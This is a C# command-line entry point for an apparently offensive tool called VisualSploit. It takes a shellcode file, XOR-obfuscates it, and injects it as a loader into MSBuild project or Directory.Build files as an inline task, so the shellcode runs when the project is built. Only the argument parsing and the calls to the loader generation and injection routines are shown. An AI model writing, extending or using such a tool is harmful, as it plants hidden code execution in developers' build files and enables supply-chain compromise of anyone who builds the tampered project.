using System.CommandLine;

namespace VisualSploit;

class Program
{
    internal static int Main(string[] args)
    {
        var targetArg = new Argument<FileInfo>("target")
        {
            Description = "Target .csproj, .vbproj, .proj, .props, .targets, or Directory.Build.props/targets"
        };
        targetArg.Validators.Add(r =>
        {
            var target = r.GetValue(targetArg);
            if (target is null) return;
            var error = ValidateTargetFilename(target.Name);
            if (error is not null) r.AddError(error);
        });

        var shellcodeArg = new Argument<FileInfo>("shellcode")
        {
            Description = "Shellcode file"
        };
        shellcodeArg.AcceptExistingOnly();

        var outputOption = new Option<FileInfo?>("--output", "-o")
        {
            Description = "Output path (default: in-place)",
            HelpName = "path"
        };

        var noBackupOption = new Option<bool>("--no-backup")
        {
            Description = "Skip .bak when writing over an existing file"
        };

        var roundsOption = new Option<int>("-r", "--rounds")
        {
            Description = $"XOR rounds 1-{Config.MaxXorRounds}",
            DefaultValueFactory = _ => 3
        };
        roundsOption.Validators.Add(r =>
        {
            var v = r.GetValue(roundsOption);
            if (v < 1 || v > Config.MaxXorRounds)
                r.AddError($"XOR rounds must be between 1 and {Config.MaxXorRounds}");
        });

        var seedOption = new Option<int?>("-s", "--seed")
        {
            Description = "RNG seed for reproducibility"
        };

        var platformOption = new Option<TargetPlatform>("--platform")
        {
            Description = "Target platform for emitted loader",
            HelpName = "windows|linux",
            DefaultValueFactory = _ => TargetPlatform.Windows
        };

        var shellcodeFormatOption = new Option<ShellcodeFormat>("--shellcode-format")
        {
            Description = "Shellcode input format",
            HelpName = "auto|raw|hex",
            DefaultValueFactory = _ => ShellcodeFormat.Auto
        };

        var conditionOption = new Option<string?>("--condition")
        {
            Description = "MSBuild condition for generated target",
            HelpName = "expr"
        };
        conditionOption.Validators.Add(r =>
        {
            var value = r.GetValue(conditionOption);
            if (value is not null && string.IsNullOrWhiteSpace(value))
                r.AddError("Condition cannot be empty");
        });

        var dryRunOption = new Option<bool>("--dry-run", "-n")
        {
            Description = "Show injected XML without writing files"
        };

        var verboseOption = new Option<bool>("--verbose", "-v")
        {
            Description = "Log injection summary to stderr"
        };

        var root = new RootCommand("MSBuild inline task injection.")
        {
            targetArg,
            shellcodeArg,
            outputOption,
            noBackupOption,
            roundsOption,
            seedOption,
            platformOption,
            shellcodeFormatOption,
            conditionOption,
            dryRunOption,
            verboseOption
        };

        Config BuildConfig(ParseResult ctx)
        {
            var target = ctx.GetValue(targetArg)!;
            var shellcode = ctx.GetValue(shellcodeArg)!;
            var output = ctx.GetValue(outputOption);
            var noBackup = ctx.GetValue(noBackupOption);
            var rounds = ctx.GetValue(roundsOption);
            var seed = ctx.GetValue(seedOption);
            var platform = ctx.GetValue(platformOption);
            var shellcodeFormat = ctx.GetValue(shellcodeFormatOption);
            var condition = ctx.GetValue(conditionOption);
            var dryRun = ctx.GetValue(dryRunOption);
            var verbose = ctx.GetValue(verboseOption);

            return new Config(
                TargetPath: target.FullName,
                ShellcodePath: shellcode.FullName,
                OutputPath: output?.FullName,
                XorRounds: rounds,
                Seed: seed,
                Platform: platform,
                ShellcodeFormat: shellcodeFormat,
                Condition: condition,
                NoBackup: noBackup,
                DryRun: dryRun,
                Verbose: verbose);
        }

        root.SetAction(parseResult =>
        {
            var cfg = BuildConfig(parseResult);
            try
            {
                var shellcode = Shellcode.Parse(cfg.ShellcodePath, cfg.ShellcodeFormat);
                var naming = new Naming(cfg.Seed);
                var inlineCode = Loader.Generate(shellcode, cfg, naming);
                MSBuild.Inject(inlineCode, cfg, naming);
                return 0;
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine($"Error: {ex.Message}");
                return 1;
            }
        });

        return root.Parse(args).Invoke();
    }

    static string? ValidateTargetFilename(string filename)
    {
        var ext = Path.GetExtension(filename);
        if (ext.Equals(".csproj", StringComparison.OrdinalIgnoreCase) ||
            ext.Equals(".vbproj", StringComparison.OrdinalIgnoreCase) ||
            ext.Equals(".proj", StringComparison.OrdinalIgnoreCase) ||
            ext.Equals(".props", StringComparison.OrdinalIgnoreCase) ||
            ext.Equals(".targets", StringComparison.OrdinalIgnoreCase))
            return null;

        return "Target must be one of: *.csproj, *.vbproj, *.proj, *.props, *.targets, Directory.Build.props, Directory.Build.targets";
    }
}
